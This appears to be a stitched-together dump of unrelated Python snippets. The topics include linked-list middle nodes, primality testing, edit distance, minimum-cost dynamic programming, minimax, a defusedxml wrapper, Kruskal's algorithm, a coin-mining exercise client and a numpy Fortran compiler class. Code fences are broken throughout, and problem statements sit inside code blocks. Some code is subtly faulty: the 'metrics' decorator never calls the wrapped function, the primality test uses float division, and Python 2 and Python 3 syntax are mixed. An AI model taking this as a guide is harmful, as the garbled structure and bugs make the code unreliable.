@metrics
def inc(n):
    return n + 1


inc(3)

from functools import wraps


def metrics(fn):
    ncalls = 0
    name = fn.__name__

    @wraps(fn)
    def wrapper(*args, **kw):
        nonlocal ncalls
        ncalls += 1
        print(f"{name} called {ncalls} times")

    return wrapper


@metrics
def inc(n):
    return n + 1


inc(3)
```

```py
Given a non-empty, singly linked list with head node head, return a middle node of linked list.

If there are two middle nodes, return the second middle node.
```

```py


# Definition for singly-linked list.
class ListNode:
    def __init__(self, x):
        self.val = x
        self.next = None


class Solution:
    def middleNode(self, head: ListNode) -> ListNode:
        get_len = 0
        current = head
        while current:
            get_len += 1
            current = current.next
        mid = get_len // 2
        current = head
        while mid > 0:
            current = current.next
            mid -= 1
        return current

# lets code up a simple solution
```

```py
- take 2 pointers label 1 `middle` and 1 to be `end`
- start a loop putting both pointer at the initial node
- while `end` pointer is not `None`
- increment the `end` pointer to the next node
- if the `end` pointer is not none
- increment the `end` pointer and increment the `middle` pointer to their next node respectively
- When the while loop ends print out the value of the node that the `middle` pointer is pointing to
```

```py

class Node:
    def __init__(self, value):
        self.value = value
        self.next = None

    def add(self, value):
        self.next = Node(value)

    def find_middle(self):
        # pointer to middle
        middle = self

        # pointer to end
        end = self

        # while the end is not none
        while end != None:
            # increment end
            end = end.next
            # in the end is not none
            if end:
                # increment end
                end = end.next
                # increment middle
                middle = middle.next


        # print the value of the middle
        print(f"Middle Value is {middle.value}")


# (4)->(7)->(m9)->(2)->(12)  e = None -> 9
root = Node(4)

current_node = root

current_node.add(7)

current_node = current_node.next

current_node.add(9)

current_node = current_node.next

current_node.add(2)

current_node = current_node.next

current_node.add(12)

current_node = current_node.next

current_node.add(120)

root.find_middle()
# middle and end are now root

# lets code up a simple solution
```

```py
- take 2 pointers label 1 `middle` and 1 to be `end`
- start a loop putting both pointer at the initial node
- while `end` pointer is not `None`
- increment the `end` pointer to the next node
- if the `end` pointer is not none and the `end.next` is not None
- increment the `end` pointer and increment the `middle` pointer to their next node respectively
- When the while loop ends print out the value of the node that the `middle` pointer is pointing to
```

```py

class Node:
    def __init__(self, value):
        self.value = value
        self.next = None

    def add(self, value):
        self.next = Node(value)

    def find_middle(self):
        # pointer to middle
        middle = self

        # pointer to end
        end = self

        # while the end is not none
        while end != None:
            # increment end
            end = end.next
            # in the end is not none
            if end and end.next:
                # increment end
                end = end.next
                # increment middle
                middle = middle.next


        # print the value of the middle
        print(f"Middle Value is {middle.value}")


# (4)->(7)->(m9)->(2)->(12)  e = None -> 9
root = Node(4)

current_node = root

current_node.add(7)

current_node = current_node.next

current_node.add(9)

current_node = current_node.next

current_node.add(2)

current_node = current_node.next

current_node.add(12)

current_node = current_node.next

current_node.add(120)

root.find_middle()
# middle and end are now root

class Node:
    def __init__(self, data: int) -> int:
        self.data = data
        self.next = None


class LinkedList:
    def __init__(self):
        self.head = None

    def push(self, new_data: int) -> int:
        new_node = Node(new_data)
        new_node.next = self.head
        self.head = new_node
        return self.head.data

    def middle_element(self) -> int:
        """
        >>> link = LinkedList()
        >>> link.middle_element()
        No element found.
        >>> link.push(5)
        5
        >>> link.push(6)
        6
        >>> link.push(8)
        8
        >>> link.push(8)
        8
        >>> link.push(10)
        10
        >>> link.push(12)
        12
        >>> link.push(17)
        17
        >>> link.push(7)
        7
        >>> link.push(3)
        3
        >>> link.push(20)
        20
        >>> link.push(-20)
        -20
        >>> link.middle_element()
        12
        >>>
        """
        slow_pointer = self.head
        fast_pointer = self.head
        if self.head:
            while fast_pointer and fast_pointer.next:
                fast_pointer = fast_pointer.next.next
                slow_pointer = slow_pointer.next
            return slow_pointer.data
        else:
            print("No element found.")


if __name__ == "__main__":
    link = LinkedList()
    for i in range(int(input().strip())):
        data = int(input().strip())
        link.push(data)
    print(link.middle_element())

# -*- coding: utf-8 -*-

# Define here the models for your spider middleware
#
# See documentation in:
# http://doc.scrapy.org/en/latest/topics/spider-middleware.html

from scrapy import signals


class FundrazrSpiderMiddleware(object):
    # Not all methods need to be defined. If a method is not defined,
    # scrapy acts as if the spider middleware does not modify the
    # passed objects.

    @classmethod
    def from_crawler(cls, crawler):
        # This method is used by Scrapy to create your spiders.
        s = cls()
        crawler.signals.connect(s.spider_opened, signal=signals.spider_opened)
        return s

    def process_spider_input(response, spider):
        # Called for each response that goes through the spider
        # middleware and into the spider.

        # Should return None or raise an exception.
        return None

    def process_spider_output(response, result, spider):
        # Called with the results returned from the Spider, after
        # it has processed the response.

        # Must return an iterable of Request, dict or Item objects.
        for i in result:
            yield i

    def process_spider_exception(response, exception, spider):
        # Called when a spider or process_spider_input() method
        # (from other spider middleware) raises an exception.

        # Should return either None or an iterable of Response, dict
        # or Item objects.
        pass

    def process_start_requests(start_requests, spider):
        # Called with the start requests of the spider, and works
        # similarly to the process_spider_output() method, except
        # that it doesn’t have a response associated.

        # Must return only requests (not items).
        for r in start_requests:
            yield r

    def spider_opened(self, spider):
        spider.logger.info("Spider opened: %s" % spider.name)

migration_count = str(len(ideas_to_migrate))
print("Number of suggestions to migrate: " + migration_count)

target_repo = g.get_repo(GITHUB_TARGET_REPO)

counter = 0
print("Kicking off migration to GitHub...")
for idea in ideas_to_migrate:
    counter += 1
    print("Migrating idea " + str(counter) + " of " + migration_count + "...")

    idea_text = "_No details provided._"

    if idea["text"]:
        idea_text = f.clean(idea["text"])

    # String that defines the attribution block of the issue.
    attribution_string = (
        "\n\n----------\n⚠ Idea migrated from UserVoice\n\n"
        + "**Created By:** "
        + idea["creator"]["name"]
        + "\n**Created On:** "
        + idea["created_at"]
        + "\n**Votes at Migration:** "
        + str(idea["vote_count"])
        + "\n**Supporters at Migration:** "
        + str(idea["supporters_count"])
    )

    # Define labels
    labels = []
    if idea["status"]:
        status_type = idea["status"]["name"]
        if status_type.lower() == "under review" or status_type.lower() == "planned":
            labels.append("triaged")
        elif status_type.lower() == "started":
            labels.append("in-progress")

    target_repo.create_issue(
        f.clean(idea["title"]), idea_text + attribution_string, labels=labels
    )

import random

from .binary_exp_mod import bin_exp_mod


# This is a probabilistic check to test primality, useful for big numbers!
# if it's a prime, it will return true
# if it's not a prime, the chance of it returning true is at most 1/4**prec
def is_prime(n, prec=1000):
    """
    >>> from .prime_check import prime_check
    >>> all(is_prime(i) == prime_check(i) for i in range(1000))
    True
    """
    if n < 2:
        return False

    if n % 2 == 0:
        return n == 2

    # this means n is odd
    d = n - 1
    exp = 0
    while d % 2 == 0:
        d /= 2
        exp += 1

    # n - 1=d*(2**exp)
    count = 0
    while count < prec:
        a = random.randint(2, n - 1)
        b = bin_exp_mod(a, d, n)
        if b != 1:
            flag = True
            for i in range(exp):
                if b == n - 1:
                    flag = False
                    break
                b = b * b
                b %= n
            if flag:
                return False
            count += 1
    return True


if __name__ == "__main__":
    n = abs(int(input("Enter bound : ").strip()))
    print("Here's the list of primes:")
    print(", ".join(str(i) for i in range(n + 1) if is_prime(i)))

from __future__ import print_function

try:
 xrange  #Python 2
except NameError:
 xrange = range #Python 3

'''
Algorithm for calculating the most cost-efficient sequence for converting one string into another.
The only allowed operations are
---Copy character with cost cC
---Replace character with cost cR
---Delete character with cost cD
---Insert character with cost cI
'''
def compute_transform_tables(X, Y, cC, cR, cD, cI):
 X = list(X)
 Y = list(Y)
 m = len(X)
 n = len(Y)

 costs = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]
 ops = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]

 for i in xrange(1, m+1):
  costs[i][0] = i*cD
  ops[i][0] = 'D%c' % X[i-1]

 for i in xrange(1, n+1):
  costs[0][i] = i*cI
  ops[0][i] = 'I%c' % Y[i-1]

 for i in xrange(1, m+1):
  for j in xrange(1, n+1):
   if X[i-1] == Y[j-1]:
    costs[i][j] = costs[i-1][j-1] + cC
    ops[i][j] = 'C%c' % X[i-1]
   else:
    costs[i][j] = costs[i-1][j-1] + cR
    ops[i][j] = 'R%c' % X[i-1] + str(Y[j-1])

   if costs[i-1][j] + cD < costs[i][j]:
    costs[i][j] = costs[i-1][j] + cD
    ops[i][j] = 'D%c' % X[i-1]

   if costs[i][j-1] + cI < costs[i][j]:
    costs[i][j] = costs[i][j-1] + cI
    ops[i][j] = 'I%c' % Y[j-1]

 return costs, ops

def assemble_transformation(ops, i, j):
 if i == 0 and j == 0:
  seq = []
  return seq
 else:
  if ops[i][j][0] == 'C' or ops[i][j][0] == 'R':
   seq = assemble_transformation(ops, i-1, j-1)
   seq.append(ops[i][j])
   return seq
  elif ops[i][j][0] == 'D':
   seq = assemble_transformation(ops, i-1, j)
   seq.append(ops[i][j])
   return seq
  else:
   seq = assemble_transformation(ops, i, j-1)
   seq.append(ops[i][j])
   return seq

if __name__ == '__main__':
 from time import sleep
 _, operations = compute_transform_tables('Python', 'Algorithms', -1, 1, 2, 2)

 m = len(operations)
 n = len(operations[0])
 sequence = assemble_transformation(operations, m-1, n-1)

 file = open('min_cost.txt', 'w')

 string = list('Python')
 i = 0
 cost = 0
 for op in sequence:
  print(''.join(string))

  if op[0] == 'C':
   file.write('%-16s' % 'Copy %c' % op[1])
   file.write('\t\t\t' + ''.join(string))
   file.write('\r\n')

   cost -= 1
  elif op[0] == 'R':
   string[i] = op[2]

   file.write('%-16s' % ('Replace %c' % op[1] + ' with ' + str(op[2])))
   file.write('\t\t' + ''.join(string))
   file.write('\r\n')

   cost += 1
  elif op[0] == 'D':
   string.pop(i)

   file.write('%-16s' % 'Delete %c' % op[1])
   file.write('\t\t\t' + ''.join(string))
   file.write('\r\n')

   cost += 2
  else:
   string.insert(i, op[1])

   file.write('%-16s' % 'Insert %c' % op[1])
   file.write('\t\t\t' + ''.join(string))
   file.write('\r\n')

   cost += 2

  i += 1

 print(''.join(string))
 print('Cost: ', cost)

 file.write('\r\nMinimum cost: ' + str(cost))
 file.close()

#!/usr/bin/python
# -*- coding: utf-8 -*-


# Finds the minium number
# in un-sorted data

# Sudo Algo:
# Iterate through data
# each time a number(say k) is less than previous
# consideration(say p), replace previous
# consideration(p) with that smaller number(k)
# By this way,
#  At last we get the smallest(minium) number from data


def min_(seq):
    min_n = seq[0]
    for item in seq[1:]:
        if item < min_n:
            min_n = item
    return min_n


# Test
# Add your tests too!
tests = [
    [9017289, 782367, 736812903, 9367821, 71256716278, 676215, 2398, 0, 1],
    [19208, 9239, 4376, 738, 78, 51, 5, 6, 12, 78, 123, 65765, 1999999999],
    [1, 2, 4, 7, 9],
]

# checking our functions results
# with python's built-in min() function
for test_i in range(len(tests)):
    m = min_(tests[test_i])
    if m == min(tests[test_i]):
        print("Min number in array({}) -> ".format(test_i + 1) + str(m))
    else:
        print("Oops! Someting went wrong!")

# find the minimum positive integer that is NOT contained in a given array
# e.g. [1, 5, 2, 3] would give 4
import time

start = time.time()


def solution(A):

    solution.n = 1

    def getMin(num):
        if solution.n == num:
            solution.n += 1
        return num

    B = sorted(A, key=getMin)

    print(solution.n)
    return solution.n


# test cases
solution([1, 3, 5, 7])  # 2
solution([1, 5, 2, 3])  # 4
solution([1, 5, 2, 3, 1, 3, 5, 7])  # 4
solution([7, 6, 5, 4])  # 1
solution([7, 6, 5, 4, 1, 2])  # 3
solution([1, 2])  # 3
solution([-1, 0, 1])  # 2

end = time.time()
print(end - start)

from functools import cmp_to_key


class Solution:
    def minNumber(self, nums):
        nums = [str(i) for i in nums]
        arr = sorted(nums, key=cmp_to_key(lambda x, y: int(x + y) - int(y + x)))
        return "".join(arr)


if __name__ == "__main__":
    s = Solution()
    result = s.minNumber([3, 30, 34, 5, 9])
    print(result)

import string


def lower_(arr):
    """
 For conversion of every element in list to lower
 """
    for i in range(len(arr)):
        arr[i] = arr[i].lower()


def min_alphabetical_order(s):
    """
 Useful on lists containing strings that start from alphabets,
 because the algorithm is written for it in the first place!
 """
    copy = s[:]
    useful = list(string.ascii_lowercase)
    lower_(s)
    res = s[0]
    for word in s[1:]:
        tmp = word[0]
        if useful.index(tmp) < useful.index(res[0]):
            res = word
    return copy[s.index(res)]


# Test
case1 = ["Alpha", "Beta", "Gist", "exotic", "hells kitchen", "word", "Ultra", "zip"]
call = min_alphabetical_order(case1)
print("Max element in list by alphabet order:\n" + call)
```

````py
Min Cost Coloring

A builder is looking to build a row of N houses that can be of K different colors.
He has a goal of minimizing cost while ensuring that no two neighboring houses are of the same color.
Given an N by K matrix where the nth row and kth column represents the cost to build the
nth house with kth color, return the minimum cost which achieves this goal.

=========================================
Dynamic programming, for each house search for the cheapest combination of the previous houses.
But don't search the whole array with combinations (colors), save only the smallest 2
(in this case we're sure that the previous house doesn't have the same color).
    Time Complexity:    O(N * K)
    Space Complexity:   O(1)```


```py

############
# Solution #
############

import math


def min_cost_coloring(dp):
    # no need from a new dp matrix, you can use the input matrix
    n = len(dp)
    if n == 0:
        return 0
    m = len(dp[0])
    if m < 2:
        return -1

    # save only the smallest 2 costs instead of searching the whole previous array
    prev_min = [(0, -1), (0, -1)]

    for i in range(n):
        curr_min = [(math.inf, -1), (math.inf, -1)]

        for j in range(m):
            # find result with different color
            if j != prev_min[0][1]:
                dp[i][j] += prev_min[0][0]
            else:
                dp[i][j] += prev_min[1][0]

            # save the current result if smaller than the current 2
            if curr_min[0][0] > dp[i][j]:
                curr_min[1] = curr_min[0]
                curr_min[0] = (dp[i][j], j)
            elif curr_min[1][0] > dp[i][j]:
                curr_min[1] = (dp[i][j], j)

        prev_min = curr_min

    # return the min cost of the last house
    return min(dp[n - 1])


###########
# Testing #
###########

# Test 1
# Correct result => 5
print(
    min_cost_coloring(
        [[1, 2, 3, 4, 5], [5, 4, 3, 2, 1], [3, 2, 1, 4, 5], [3, 2, 1, 4, 3]]
    )
)

# Test 2
# Correct result => 6
print(
    min_cost_coloring(
        [[1, 2, 3, 4, 5], [1, 2, 3, 4, 5], [1, 2, 3, 4, 5], [1, 2, 3, 4, 5]]
    )
)
````

````py
Author: MrDupin
Created At: 25th August 2017```


```py
import inspect

# Path(i, j) = min(Path(i-1, j), Path(i, j-1) + Matrix(i, j)


def calculate_path(i, j, matrix, s):
    if s[i][j] > 0:
        # We have already calculated solution for i,j; return it.
        return s[i][j]

    m1 = (
        calculate_path(i - 1, j, matrix, s) + matrix[i][j]
    )  # Optimal solution for i-1, j (top)
    m2 = (
        calculate_path(i, j - 1, matrix, s) + matrix[i][j]
    )  # Optimal solution for i, j-1 (left)

    # Store and return the optimal (minimum) solution
    if m1 < m2:
        s[i][j] = m1
        return m1
    else:
        s[i][j] = m2
        return m2


def find_path(matrix):
    l = len(matrix)
    # Initialize solution array.
    # A node of i, j in solution has an equivalent node of i, j in matrix
    s = [[0 for i in range(l)] for j in range(l)]

    # Initialize first node as its matrix equivalent
    s[0][0] = matrix[0][0]

    # Initialize first column as the matrix equivalent + the above solution
    for i in range(1, l):
        s[i][0] = matrix[i][0] + s[i - 1][0]

    # Initialize first row as the matrix equivalent + the left solution
    for j in range(1, l):
        s[0][j] = matrix[0][j] + s[0][j - 1]

    return calculate_path(l - 1, l - 1, matrix, s)


def get_code():
    """
    returns the code for the min cost path function
    """
    return inspect.getsource(calculate_path)


def  compare(li):
 if (len(li) == 1):
  return "Single Value To Compare {} in List".format(li[0])
 res = 0
 for i in range(len(li) - 1):
  a = li[i]
  b = li[i + 1]
  if (a < b):
   if (i != 0):
    if (a < res):
     res = a
   else:
    res = a
  else:
   if (i != 0):
    if (b < res):
     res = b
   else:
    res = b
 return res

def convert():
 get_input = raw_input("Enter Space Seperated Numbers : ")
 raw = get_input.split()
 nums = []
 for i in raw:
  nums.append(float(i))
 return nums

if __name__ == "__main__":
 print compare(convert())
````

````py
Min Swaps

You have a list of numbers and you want to sort the list.
The only operation you have is a swap of any two arbitrary numbers.
Find the minimum number of swaps you need to do in order to make the list sorted (ascending order).
- The array will contain N elements
- Each element will be between 1 and N inclusive
- All the numbers will be different

Input: [4, 1, 3, 2]
Output: 2
Output explanation: swap(4, 1) = [1, 4, 3, 2], swap(4, 2) = [1, 2, 3, 4]

=========================================
According to the description, all elements will have their position in the array,
for example, K should be located at K-1 in the array.
Itterate the array and check if each position has the right element,
if not, put that element in the right position and check again.
    Time Complexity:    O(N)    , the solution looks like O(N^2) but that's not possible, at most O(2*N) operations can be done
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def min_swaps(a):
    n = len(a)
    swaps = 0

    for i in range(n):
        # swap the elements till the right element isn't found
        while a[i] - 1 != i:
            swap = a[i] - 1
            # swap the elements
            a[swap], a[i] = a[i], a[swap]

            swaps += 1

    return swaps


###########
# Testing #
###########

# Test 1
# Correct result => 2
print(min_swaps([4, 1, 3, 2]))

# Test 2
# Correct result => 3
print(min_swaps([4, 1, 2, 3]))

import hashlib
import requests

import sys

from uuid import uuid4

from timeit import default_timer as timer

import random


def proof_of_work(last_proof):
    """
    Multi-Ouroboros of Work Algorithm
    - Find a number p' such that the last six digits of hash(p) are equal
    to the first six digits of hash(p')
    - IE:  last_hash: ...999123456, new hash 123456888...
    - p is the previous proof, and p' is the new proof
    """

    start = timer()

    print("Searching for next proof")
    proof = 0
    #  TODO: Your code here

    print("Proof found: " + str(proof) + " in " + str(timer() - start))
    return proof


def valid_proof(last_hash, proof):
    """
    Validates the Proof:  Multi-ouroborus:  Do the last six characters of
    the last hash match the first six characters of the proof?

    IE:  last_hash: ...999123456, new hash 123456888...
    """

    # TODO: Your code here!
    pass


if __name__ == '__main__':
    # What node are we interacting with?
    if len(sys.argv) > 1:
        node = sys.argv[1]
    else:
        node = "https://lambda-coin.herokuapp.com"

    coins_mined = 0

    # Load or create ID
    f = open("my_id.txt", "r")
    id = f.read()
    print("ID is", id)
    f.close()
    if len(id) == 0:
        f = open("my_id.txt", "w")
        # Generate a globally unique ID
        id = str(uuid4()).replace('-', '')
        print("Created new ID: " + id)
        f.write(id)
        f.close()
    # Run forever until interrupted
    while True:
        # Get the last proof from the server
        r = requests.get(url=node + "/last_proof")
        data = r.json()
        new_proof = proof_of_work(data.get('proof'))

        post_data = {"proof": new_proof,
                     "id": id}

        r = requests.post(url=node + "/mine", json=post_data)
        data = r.json()
        if data.get('message') == 'New Block Forged':
            coins_mined += 1
            print("Total coins mined: " + str(coins_mined))
        else:
            print(data.get('message'))

def get_adjacent_cells(i, j, m, n):

    coords = []
    if i >= 1:
        if j >= 1:
            coords += [[i - 1, j - 1]]
        coords += [[i - 1, j]]

        if j < n - 1:
            coords += [[i - 1, j + 1]]

    if i < m - 1:
        if j >= 1:
            coords += [[i + 1, j - 1]]
        coords += [[i + 1, j]]

        if j < n - 1:
            coords += [[i + 1, j + 1]]

    if j >= 1:
        coords += [[i, j - 1]]

    if j < n - 1:
        coords += [[i, j + 1]]

    return coords


def minesweeper(matrix):

    m = len(matrix)
    n = len(matrix[0])

    num_matrix = [[0] * n for _ in range(m)]

    for i in range(m):
        for j in range(n):
            if matrix[i][j]:
                matrix[i][j] = 1
            else:
                matrix[i][j] = 0

    for i in range(m):
        for j in range(n):

            coords = get_adjacent_cells(i, j, m, n)
            cur_sum = sum([matrix[x][y] for (x, y) in coords])
            num_matrix[i][j] = cur_sum

    return num_matrix

# defusedxml
#
# Copyright (c) 2013 by Christian Heimes <christian@python.org>
# Licensed to PSF under a Contributor Agreement.
# See https://www.python.org/psf/license for licensing details.```


```pyDefused xml.dom.minidom```


```py
from __future__ import print_function, absolute_import

from xml.dom.minidom import _do_pulldom_parse
from . import expatbuilder as _expatbuilder
from . import pulldom as _pulldom

__origin__ = "xml.dom.minidom"


def parse(
    file, parser=None, bufsize=None, forbid_dtd=False, forbid_entities=True, forbid_external=True
):
    """Parse a file into a DOM by filename or file object."""
    if parser is None and not bufsize:
        return _expatbuilder.parse(
            file,
            forbid_dtd=forbid_dtd,
            forbid_entities=forbid_entities,
            forbid_external=forbid_external,
        )
    else:
        return _do_pulldom_parse(
            _pulldom.parse,
            (file,),
            {
                "parser": parser,
                "bufsize": bufsize,
                "forbid_dtd": forbid_dtd,
                "forbid_entities": forbid_entities,
                "forbid_external": forbid_external,
            },
        )


def parseString(
    string, parser=None, forbid_dtd=False, forbid_entities=True, forbid_external=True
):
    """Parse a file into a DOM from a string."""
    if parser is None:
        return _expatbuilder.parseString(
            string,
            forbid_dtd=forbid_dtd,
            forbid_entities=forbid_entities,
            forbid_external=forbid_external,
        )
    else:
        return _do_pulldom_parse(
            _pulldom.parseString,
            (string,),
            {
                "parser": parser,
                "forbid_dtd": forbid_dtd,
                "forbid_entities": forbid_entities,
                "forbid_external": forbid_external,
            },
        )
````

````py
Minimax helps to achieve maximum score in a game by checking all possible moves
depth is current depth in game tree.

nodeIndex is index of current node in scores[].
if move is of maximizer return true else false
leaves of game tree is stored in scores[]
height is maximum height of Game tree```


```py
import math
from typing import List


def minimax(
    depth: int, node_index: int, is_max: bool, scores: List[int], height: float
) -> int:
    """
    >>> import math
    >>> scores = [90, 23, 6, 33, 21, 65, 123, 34423]
    >>> height = math.log(len(scores), 2)
    >>> minimax(0, 0, True, scores, height)
    65
    >>> minimax(-1, 0, True, scores, height)
    Traceback (most recent call last):
        ...
    ValueError: Depth cannot be less than 0
    >>> minimax(0, 0, True, [], 2)
    Traceback (most recent call last):
        ...
    ValueError: Scores cannot be empty
    >>> scores = [3, 5, 2, 9, 12, 5, 23, 23]
    >>> height = math.log(len(scores), 2)
    >>> minimax(0, 0, True, scores, height)
    12
    """

    if depth < 0:
        raise ValueError("Depth cannot be less than 0")

    if len(scores) == 0:
        raise ValueError("Scores cannot be empty")

    if depth == height:
        return scores[node_index]

    if is_max:
        return max(
            minimax(depth + 1, node_index * 2, False, scores, height),
            minimax(depth + 1, node_index * 2 + 1, False, scores, height),
        )

    return min(
        minimax(depth + 1, node_index * 2, True, scores, height),
        minimax(depth + 1, node_index * 2 + 1, True, scores, height),
    )


def main() -> None:
    scores = [90, 23, 6, 33, 21, 65, 123, 34423]
    height = math.log(len(scores), 2)
    print("Optimal value : ", end="")
    print(minimax(0, 0, True, scores, height))


if __name__ == "__main__":
    import doctest

    doctest.testmod()
    main()

# Source : https://leetcode.com/problems/minimum-absolute-difference-in-bst/?tab=Description
# Author : Han Zichi
# Date   : 2017-03-01

# Definition for a binary tree node.
# class TreeNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution(object):
    def getMinimumDifference(self, root):
        """
        :type root: TreeNode
        :rtype: int
        """

        def dfs(node):
            if node == None:
                return
            res.append(node.val)
            if node.left:
                dfs(node.left)
            if node.right:
                dfs(node.right)

        res = []
        dfs(root)
        res = sorted(res)

        ans = 99999999
        for i in range(len(res)):
            if i:
                ans = min(ans, res[i] - res[i - 1])

        return ans
````

````py
You have m types of coins available in infinite quantities
where the value of each coins is given in the array S=[S0,... Sm-1]
Can you determine number of ways of making change for n units using
the given types of coins?
https://www.hackerrank.com/challenges/coin-change/problem```


```py


def dp_count(S, n):
    """
    >>> dp_count([1, 2, 3], 4)
    4
    >>> dp_count([1, 2, 3], 7)
    8
    >>> dp_count([2, 5, 3, 6], 10)
    5
    >>> dp_count([10], 99)
    0
    >>> dp_count([4, 5, 6], 0)
    1
    >>> dp_count([1, 2, 3], -5)
    0
    """
    if n < 0:
        return 0
    # table[i] represents the number of ways to get to amount i
    table = [0] * (n + 1)

    # There is exactly 1 way to get to zero(You pick no coins).
    table[0] = 1

    # Pick all coins one by one and update table[] values
    # after the index greater than or equal to the value of the
    # picked coin
    for coin_val in S:
        for j in range(coin_val, n + 1):
            table[j] += table[j - coin_val]

    return table[n]


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# Youtube Explanation: https://www.youtube.com/watch?v=lBRtnuxg-gU

from __future__ import annotations


def minimum_cost_path(matrix: list[list[int]]) -> int:
    """
    Find the minimum cost traced by all possible paths from top left to bottom right in
    a given matrix

    >>> minimum_cost_path([[2, 1], [3, 1], [4, 2]])
    6

    >>> minimum_cost_path([[2, 1, 4], [2, 1, 3], [3, 2, 1]])
    7
    """

    # preprocessing the first row
    for i in range(1, len(matrix[0])):
        matrix[0][i] += matrix[0][i - 1]

    # preprocessing the first column
    for i in range(1, len(matrix)):
        matrix[i][0] += matrix[i - 1][0]

    # updating the path cost for current position
    for i in range(1, len(matrix)):
        for j in range(1, len(matrix[0])):
            matrix[i][j] += min(matrix[i - 1][j], matrix[i][j - 1])

    return matrix[-1][-1]


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# Minimum cut on Ford_Fulkerson algorithm.

def BFS(graph, s, t, parent):
    # Return True if there is node that has not iterated.
    visited = [False]*len(graph)
    queue=[]
    queue.append(s)
    visited[s] = True

    while queue:
        u = queue.pop(0)
        for ind in range(len(graph[u])):
            if visited[ind] == False and graph[u][ind] > 0:
                queue.append(ind)
                visited[ind] = True
                parent[ind] = u

    return True if visited[t] else False

def mincut(graph, source, sink):
    # This array is filled by BFS and to store path
    parent = [-1]*(len(graph))
    max_flow = 0
    res = []
    temp = [i[:] for i in graph]   # Record orignial cut, copy.
    while BFS(graph, source, sink, parent) :
        path_flow = float("Inf")
        s = sink

        while(s !=  source):
            # Find the minimum value in select path
            path_flow = min (path_flow, graph[parent[s]][s])
            s = parent[s]

        max_flow +=  path_flow
        v = sink

        while(v !=  source):
            u = parent[v]
            graph[u][v] -= path_flow
            graph[v][u] += path_flow
            v = parent[v]

    for i in range(len(graph)):
        for j in range(len(graph[0])):
            if graph[i][j] == 0 and temp[i][j] > 0:
                res.append((i,j))

    return res

graph = [[0, 16, 13, 0, 0, 0],
         [0, 0, 10 ,12, 0, 0],
         [0, 4, 0, 0, 14, 0],
         [0, 0, 9, 0, 0, 20],
         [0, 0, 0, 7, 0, 4],
         [0, 0, 0, 0, 0, 0]]

source, sink = 0, 5
print(mincut(graph, source, sink))```


```py
Partition a set into two subsets such that the difference of subset sums is minimum```


```py
def findMin(arr):
    n = len(arr)
    s = sum(arr)

    dp = [[False for x in range(s+1)]for y in range(n+1)]

    for i in range(1, n+1):
        dp[i][0] = True

    for i in range(1, s+1):
        dp[0][i] = False

    for i in range(1, n+1):
        for j in range(1, s+1):
            dp[i][j]= dp[i][j-1]

            if (arr[i-1] <= j):
                dp[i][j] = dp[i][j] or dp[i-1][j-arr[i-1]]

    for j in range(int(s/2), -1, -1):
        if dp[n][j] == True:
            diff = s-2*j
            break;

    return diff

from __future__ import print_function
num_nodes, num_edges = list(map(int,input().split()))

edges = []

for i in range(num_edges):
 node1, node2, cost = list(map(int,input().split()))
 edges.append((i,node1,node2,cost))

edges = sorted(edges, key=lambda edge: edge[3])

parent = [i for i in range(num_nodes)]

def find_parent(i):
 if(i != parent[i]):
  parent[i] = find_parent(parent[i])
 return parent[i]

minimum_spanning_tree_cost = 0
minimum_spanning_tree = []

for edge in edges:
 parent_a = find_parent(edge[1])
 parent_b = find_parent(edge[2])
 if(parent_a != parent_b):
  minimum_spanning_tree_cost += edge[3]
  minimum_spanning_tree.append(edge)
  parent[parent_a] = parent_b

print(minimum_spanning_tree_cost)
for edge in minimum_spanning_tree:
 print(edge)
````

````py
YouTube Explanation: https://www.youtube.com/watch?v=f2xi3c1S95M

Given an integer n, return the minimum steps to 1

AVAILABLE STEPS:
    * Decrement by 1
    * if n is divisible by 2, divide by 2
    * if n is divisible by 3, divide by 3


Example 1: n = 10
10 -> 9 -> 3 -> 1
Result: 3 steps

Example 2: n = 15
15 -> 5 -> 4 -> 2 -> 1
Result: 4 steps

Example 3: n = 6
6 -> 2 -> 1
Result: 2 step```


```py

from __future__ import annotations

__author__ = "Alexander Joslin"


def min_steps_to_one(number: int) -> int:
    """
    Minimum steps to 1 implemented using tabulation.
    >>> min_steps_to_one(10)
    3
    >>> min_steps_to_one(15)
    4
    >>> min_steps_to_one(6)
    2

    :param number:
    :return int:
    """

    if number <= 0:
        raise ValueError(f"n must be greater than 0. Got n = {number}")

    table = [number + 1] * (number + 1)

    # starting position
    table[1] = 0
    for i in range(1, number):
        table[i + 1] = min(table[i + 1], table[i] + 1)
        # check if out of bounds
        if i * 2 <= number:
            table[i * 2] = min(table[i * 2], table[i] + 1)
        # check if out of bounds
        if i * 3 <= number:
            table[i * 3] = min(table[i * 3], table[i] + 1)
    return table[number]


if __name__ == "__main__":
    import doctest

    doctest.testmod()

from numpy.distutils.cpuinfo import cpu
from numpy.distutils.fcompiler import FCompiler

compilers = ['MIPSFCompiler']

class MIPSFCompiler(FCompiler):

    compiler_type = 'mips'
    description = 'MIPSpro Fortran Compiler'
    version_pattern =  r'MIPSpro Compilers: Version (?P<version>[^\s*,]*)'

    executables = {
        'version_cmd'  : ["<F90>", "-version"],
        'compiler_f77' : ["f77", "-f77"],
        'compiler_fix' : ["f90", "-fixedform"],
        'compiler_f90' : ["f90"],
        'linker_so'    : ["f90", "-shared"],
        'archiver'     : ["ar", "-cr"],
        'ranlib'       : None
        }
    module_dir_switch = None #XXX: fix me
    module_include_switch = None #XXX: fix me
    pic_flags = ['-KPIC']

    def get_flags(self):
        return self.pic_flags + ['-n32']
    def get_flags_opt(self):
        return ['-O3']
    def get_flags_arch(self):
        opt = []
        for a in '19 20 21 22_4k 22_5k 24 25 26 27 28 30 32_5k 32_10k'.split():
            if getattr(cpu, 'is_IP%s'%a)():
                opt.append('-TARG:platform=IP%s' % a)
                break
        return opt
    def get_flags_arch_f77(self):
        r = None
        if cpu.is_r10000(): r = 10000
        elif cpu.is_r12000(): r = 12000
        elif cpu.is_r8000(): r = 8000
        elif cpu.is_r5000(): r = 5000
        elif cpu.is_r4000(): r = 4000
        if r is not None:
            return ['r%s' % (r)]
        return []
    def get_flags_arch_f90(self):
        r = self.get_flags_arch_f77()
        if r:
            r[0] = '-' + r[0]
        return r

if __name__ == '__main__':
    from numpy.distutils import customized_fcompiler
    print(customized_fcompiler(compiler='mips').get_version())

# -*- coding: utf-8 -*-
#
